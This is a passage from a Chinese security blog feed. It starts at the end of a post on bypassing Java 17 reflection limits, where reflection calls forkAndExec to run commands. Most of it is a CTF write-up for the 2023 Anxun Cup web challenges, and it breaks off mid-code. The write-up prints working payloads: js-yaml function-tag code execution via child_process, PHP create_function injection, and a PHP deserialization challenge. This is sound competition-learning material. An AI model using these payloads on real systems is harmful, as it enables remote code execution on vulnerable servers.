System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);            i += arg.length + <span class="hljs-number">1</span>;            <span class="hljs-comment">// No need to write NUL bytes explicitly</span>        &#125;        <span class="hljs-type">int</span>[] envc                 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];        <span class="hljs-type">int</span>[] std_fds              = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;        <span class="hljs-type">Field</span> <span class="hljs-variable">launchMechanismField</span> <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;launchMechanism&quot;</span>);        <span class="hljs-type">Field</span> <span class="hljs-variable">helperpathField</span>      <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;helperpath&quot;</span>);        launchMechanismField.setAccessible(<span class="hljs-literal">true</span>);        helperpathField.setAccessible(<span class="hljs-literal">true</span>);        <span class="hljs-type">Object</span> <span class="hljs-variable">launchMechanismObject</span> <span class="hljs-operator">=</span> launchMechanismField.get(processObject);        <span class="hljs-type">byte</span>[] helperpathObject      = (<span class="hljs-type">byte</span>[]) helperpathField.get(processObject);        <span class="hljs-type">int</span> <span class="hljs-variable">ordinal</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) launchMechanismObject.getClass().getMethod(<span class="hljs-string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);        <span class="hljs-type">Method</span> <span class="hljs-variable">forkMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;forkAndExec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;                <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class,                <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>[].class, <span class="hljs-type">boolean</span>.class        &#125;);        forkMethod.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">// 设置访问权限</span>        <span class="hljs-type">int</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) forkMethod.invoke(processObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;                ordinal + <span class="hljs-number">1</span>, helperpathObject, toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span>        &#125;);        <span class="hljs-comment">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span>        <span class="hljs-type">Method</span> <span class="hljs-variable">initStreamsMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;initStreams&quot;</span>, <span class="hljs-type">int</span>[].class);        initStreamsMethod.setAccessible(<span class="hljs-literal">true</span>);        initStreamsMethod.invoke(processObject, std_fds);        <span class="hljs-comment">// 获取本地执行结果的输入流</span>        <span class="hljs-type">Method</span> <span class="hljs-variable">getInputStreamMethod</span> <span class="hljs-operator">=</span> processClass.getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);        getInputStreamMethod.setAccessible(<span class="hljs-literal">true</span>);        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">int</span>                   <span class="hljs-variable">a</span>    <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;        <span class="hljs-type">byte</span>[]                b    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];        <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;            baos.write(b, <span class="hljs-number">0</span>, a);        &#125;        <span class="hljs-keyword">return</span> baos.toString();</code></pre></div><p>同样可以用这个调用加了prefix的<code>forkAndExec</code> （就是调用方法名称改一下而已）</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>但现在来说我还用不上这些，太菜了，还在学jdk8的东西呢</p><p><a href="https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/">https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/</a></p><p><a href="https://p4d0rn.gitbook.io/java/prerequisites/unsafe">Unsafe - Java (gitbook.io)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>安洵杯校园赛2023</title>
    <link href="/2023/12/24/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/"/>
    <url>/2023/12/24/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/</url>
    
    <content type="html"><![CDATA[<h1 id="2023安洵杯第六届网络安全挑战赛-web"><a href="#2023安洵杯第六届网络安全挑战赛-web" class="headerlink" title="2023安洵杯第六届网络安全挑战赛-web"></a>2023安洵杯第六届网络安全挑战赛-web</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>web：2&#x2F;6   只会做最简单的(wuwuwuw，已经废了) 标记<code>*</code>为做出的</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225135621158.png" alt="image-20231225135621158"></p><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><p><a href="https://github.com/nodeca/js-yaml">nodeca&#x2F;js-yaml: JavaScript YAML parser and dumper. Very fast. (github.com)</a></p><p><a href="https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/">Code Execution via YAML in JS-YAML Node.js Module » Neal Poole</a></p><p>可能是关键词不对，刚开始搜<code>nodejs yaml漏洞</code>出来的全是nodejs有关的，结束后看下wp，是<code>js-yaml</code>，然后搜<code>js-yaml</code>漏洞，直接就搜到了。。。。。</p><p>sb了，复现时看了下package.json，发现是有js-yaml的，当时没注意，也算是技不如人吧</p><p>以后nodejs的题先对着package.json的版本搜漏洞，我看看哪个库能逃掉</p><p>照着官方wp的顺序走一遍吧</p><div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<span class="hljs-keyword">const</span> ini = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;iniparser&#x27;</span>);<span class="hljs-keyword">const</span> xml2js = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;xml2js&#x27;</span>);<span class="hljs-keyword">const</span> properties = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;properties&#x27;</span>);<span class="hljs-keyword">const</span> yaml = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;js-yaml&#x27;</span>);<span class="hljs-keyword">const</span> cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>);<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<span class="hljs-keyword">const</span> port = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">80</span>;<span class="hljs-comment">// 设置存储配置</span><span class="hljs-keyword">const</span> storage = multer.<span class="hljs-title function_">memoryStorage</span>();<span class="hljs-keyword">const</span> upload = <span class="hljs-title function_">multer</span>(&#123; <span class="hljs-attr">storage</span>: storage &#125;);app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<span class="hljs-attr">secret</span>: <span class="hljs-string">&#x27;welcome&#x27;</span>,<span class="hljs-comment">//</span><span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,<span class="hljs-attr">cookie</span>: &#123;<span class="hljs-attr">maxAge</span>: <span class="hljs-number">3600000</span>&#125;&#125;))<span class="hljs-keyword">let</span> output = <span class="hljs-string">&#x27;&#x27;</span>;app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>, <span class="hljs-string">&#x27;index.html&#x27;</span>));&#125;);app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/convert&#x27;</span>, upload.<span class="hljs-title function_">single</span>(<span class="hljs-string">&#x27;configFile&#x27;</span>), <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<span class="hljs-keyword">if</span> (!req.<span class="hljs-property">file</span>) &#123;<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;No file uploaded.&#x27;</span>);&#125;<span class="hljs-keyword">if</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">format</span>!=<span class="hljs-string">&quot;yaml&quot;</span>)&#123;<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;该功能暂未开始使用.&quot;</span>);&#125;<span class="hljs-keyword">const</span> fileExtension = path.<span class="hljs-title function_">extname</span>(req.<span class="hljs-property">file</span>.<span class="hljs-property">originalname</span>).<span class="hljs-title function_">toLowerCase</span>();<span class="hljs-keyword">const</span> fileBuffer = req.<span class="hljs-property">file</span>.<span class="hljs-property">buffer</span>.<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;utf8&#x27;</span>);<span class="hljs-keyword">if</span> (fileExtension === <span class="hljs-string">&#x27;.ini&#x27;</span>) &#123;<span class="hljs-comment">// 处理 INI 文件</span><span class="hljs-keyword">const</span> parsedData = ini.<span class="hljs-title function_">parseString</span>(fileBuffer);output = yaml.<span class="hljs-title function_">dump</span>(parsedData);&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fileExtension === <span class="hljs-string">&#x27;.xml&#x27;</span>) &#123;<span class="hljs-comment">// 处理 XML 文件</span>xml2js.<span class="hljs-title function_">parseString</span>(fileBuffer, <span class="hljs-function">(<span class="hljs-params">err, result</span>) =&gt;</span> &#123;<span class="hljs-keyword">if</span> (err) &#123;<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error parsing XML.&#x27;</span>);&#125;output = yaml.<span class="hljs-title function_">dump</span>(result);&#125;);&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fileExtension === <span class="hljs-string">&#x27;.properties&#x27;</span>) &#123;<span class="hljs-comment">// 处理 Properties 文件</span>properties.<span class="hljs-title function_">parse</span>(fileBuffer, <span class="hljs-function">(<span class="hljs-params">err, parsedData</span>) =&gt;</span> &#123;<span class="hljs-keyword">if</span> (err) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error parsing properties file:&#x27;</span>, err);<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error parsing properties file.&#x27;</span>);&#125;output = yaml.<span class="hljs-title function_">dump</span>(parsedData);&#125;);&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fileExtension === <span class="hljs-string">&#x27;.yaml&#x27;</span>) &#123;<span class="hljs-comment">// 处理 YAML 文件</span><span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">// 尝试解析 YAML 文件</span><span class="hljs-keyword">const</span> yamlData = yaml.<span class="hljs-title function_">load</span>(fileBuffer);<span class="hljs-comment">// 如果成功解析，yamlData 变量将包含 YAML 文件的内容</span>output = yaml.<span class="hljs-title function_">dump</span>(yamlData);&#125; <span class="hljs-keyword">catch</span> (e) &#123;<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid YAML format: &#x27;</span> + e.<span class="hljs-property">message</span>);&#125;&#125;<span class="hljs-keyword">if</span> (output) &#123;<span class="hljs-keyword">let</span> name = <span class="hljs-string">&#x27;ctfer&#x27;</span>;<span class="hljs-keyword">const</span> yamlData = yaml.<span class="hljs-title function_">load</span>(output);<span class="hljs-keyword">if</span> (yamlData &amp;&amp; yamlData.<span class="hljs-property">name</span>) &#123; name = yamlData.<span class="hljs-property">name</span>;&#125;req.<span class="hljs-property">session</span>.<span class="hljs-property">outputData</span>=name;req.<span class="hljs-property">session</span>.<span class="hljs-property">outputData</span>=output;res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;preview&#x27;</span>, &#123; <span class="hljs-attr">name</span>: name,<span class="hljs-attr">output</span>: output &#125;); <span class="hljs-comment">// 渲染 preview.ejs 模板</span>&#125; <span class="hljs-keyword">else</span> &#123;res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Unsupported format.&#x27;</span>)&#125;&#125;);app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/download&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<span class="hljs-keyword">if</span> (output) &#123;<span class="hljs-keyword">const</span> outputData = req.<span class="hljs-property">session</span>.<span class="hljs-property">outputData</span>;<span class="hljs-comment">// 设置响应头，指定文件的内容类型为YAML</span>res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/x-yaml&#x27;</span>);<span class="hljs-comment">// 设置响应头，指定文件名</span>res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>, <span class="hljs-string">&#x27;attachment; filename=&quot;output.yaml&quot;&#x27;</span>);<span class="hljs-comment">// 将转换后的文件内容发送给客户端</span>res.<span class="hljs-title function_">send</span>(outputData);&#125; <span class="hljs-keyword">else</span> &#123;res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;File not found.&#x27;</span>);&#125;&#125;);app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<span class="hljs-keyword">if</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">name</span>==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;cp.<span class="hljs-title function_">execFile</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<span class="hljs-keyword">if</span> (err) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, err);<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;File not found.&#x27;</span>);&#125;res.<span class="hljs-title function_">send</span>(stdout);&#125;)&#125; <span class="hljs-keyword">else</span> &#123;res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Permission denied.&#x27;</span>);&#125;&#125;)app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`App is running on port <span class="hljs-subst">$&#123;port&#125;</span>`</span>)&#125;)</code></pre></div><p>js-yaml的版本是3.14.1，在github上找到文档，</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225143227242.png" alt="image-20231225143227242"></p><p>发现三个标签</p><blockquote><p>js-yaml extra types:</p><ul><li>!!js&#x2F;regexp &#x2F;pattern&#x2F;gim</li><li>!!js&#x2F;undefined ‘’</li><li>!!js&#x2F;function ‘function () {…}’</li></ul></blockquote><p>查看版本升级时的变动，说是危险的标签，说明可以利用</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225144028049.png" alt="image-20231225144028049"></p><p>又因为</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225144401766.png" alt="image-20231225144401766"></p><p>若使用数组或对象作为键，会调用他的<code>toString()</code>方法，</p><p>官方payload：</p><p>上传文件后缀为yaml，内容为</p><div class="code-wrapper"><pre><code class="hljs lua"><span class="hljs-string">&quot;name&quot;</span> : &#123; toString: !!js/<span class="hljs-function"><span class="hljs-keyword">function</span> &quot;<span class="hljs-title">function</span><span class="hljs-params">()</span></span>&#123; flag = process.mainModule.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;cat /fla*&#x27;</span>).toString(); <span class="hljs-keyword">return</span> flag;&#125;<span class="hljs-string">&quot;&#125;</span></code></pre></div><p>经历load-&gt;dump-&gt;load，最后渲染到ejs的name回显出来</p><p>赛后搜索到的文章，直接就是payload了</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225153202302.png" alt="image-20231225153202302"></p><h2 id="what’s-my-name"><a href="#what’s-my-name" class="headerlink" title="what’s my name*"></a>what’s my name*</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<span class="hljs-variable">$d0g3</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d0g3&#x27;</span>];<span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(?:.&#123;5&#125;)*include/&#x27;</span>,<span class="hljs-variable">$d0g3</span>))&#123;    <span class="hljs-variable">$sorter</span>=<span class="hljs-string">&#x27;strnatcasecmp&#x27;</span>;    <span class="hljs-variable">$miao</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>, <span class="hljs-string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$miao</span>);    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$d0g3</span>)==<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$miao</span>, -<span class="hljs-number">2</span>)&amp;&amp;<span class="hljs-variable">$name</span>===<span class="hljs-variable">$miao</span>)&#123;        <span class="hljs-variable">$sort_function</span> = <span class="hljs-string">&#x27; return 1 * &#x27;</span> . <span class="hljs-variable">$sorter</span> . <span class="hljs-string">&#x27;($a[&quot;&#x27;</span> . <span class="hljs-variable">$d0g3</span> . <span class="hljs-string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="hljs-variable">$d0g3</span> . <span class="hljs-string">&#x27;&quot;]);&#x27;</span>;        @<span class="hljs-variable">$miao</span>=<span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a, $b&#x27;</span>, <span class="hljs-variable">$sort_function</span>);    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;Is That My Name?&#x27;</span>);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;YOU Do Not Know What is My Name!&quot;</span>);&#125;</code></pre></div><p><code>preg_match(&#39;/^(?:.&#123;5&#125;)*include/&#39;,$d0g3)</code></p><p>5的倍数个字符拼接<code>include</code></p><p><code>$miao = create_function(&#39;$a,$b&#39;, &#39;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#39;);</code></p><p>本地打印出$miao的值，是匿名函数的名称，<code>\x00lambda_%d</code>，并且每刷新一次页面，%d就加1</p><p>然后就是create_function漏洞，上网搜就可以</p><p>payload: <code>&quot;]);&#125;phpinfo();/*</code></p><p>知道这些就可以做题了</p><p>根据这个payload要满足第一个if条件，给他加字符</p><p><code>&quot;]);&#125;phpinfo();/*123include</code> （include前面为20个字符，满足条件）</p><p>这个长度为27，<code>substr($miao, -2)</code>也要为27，就不断刷新到27即可</p><p><code>$name===$miao</code> ，那就是匿名函数的名字，直接让他等于满足条件的情况即可 ，即<code>\x00lambda_27</code></p><p>最终payload</p><div class="code-wrapper"><pre><code class="hljs 1c">?d0g3=<span class="hljs-string">&quot;]);&#125;phpinfo();/*123include&amp;name=%00lambda_27</span>刷新<span class="hljs-number">27</span>次即可，反正一直刷新就对了</code></pre></div><h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize*"></a>ez_unserialize*</h2><p>确实挺简单的，因为非预期了</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Good</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$g1</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$gg2</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ggg3</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;gg2 = <span class="hljs-variable">$ggg3</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/a-zA-Z0-9~-=!\^\+\(\)/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;gg2))        &#123;            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;gg2)            &#123;                <span class="hljs-variable language_">$this</span>-&gt;g1-&gt;g1=<span class="hljs-number">666</span>;            &#125;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No&quot;</span>);        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Luck</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$l1</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ll2</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$md5</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lll3</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;md5 = <span class="hljs-variable">$a</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$new</span> = <span class="hljs-variable language_">$this</span>-&gt;l1;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$new</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;ll2-&gt;<span class="hljs-title function_ invoke__">ll2</span>(<span class="hljs-string">&#x27;b2&#x27;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;md5)) == <span class="hljs-number">666</span>)        &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;lll3-&gt;lll3))&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;There is noting&quot;</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">To</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t1</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tt2</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg1</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$this</span>-&gt;arg1)===<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;arg1))        &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t1;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;tt2-&gt;tt2)        &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;what are you doing?&quot;</span>;        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">You</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y1</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;y1-&gt;y1);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$SplFileObject</span> = <span class="hljs-string">&quot;/FfffLlllLaAaaggGgGg&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;May be you can get what you want here&quot;</span>;        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function (<span class="hljs-variable">$one</span>, <span class="hljs-variable">$two</span>) &#123;            <span class="hljs-variable">$three</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$two</span>(<span class="hljs-variable">$one</span>);            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$three</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$tmp</span>)&#123;                <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$tmp</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);            &#125;        &#125;);    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">You</span>();<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> 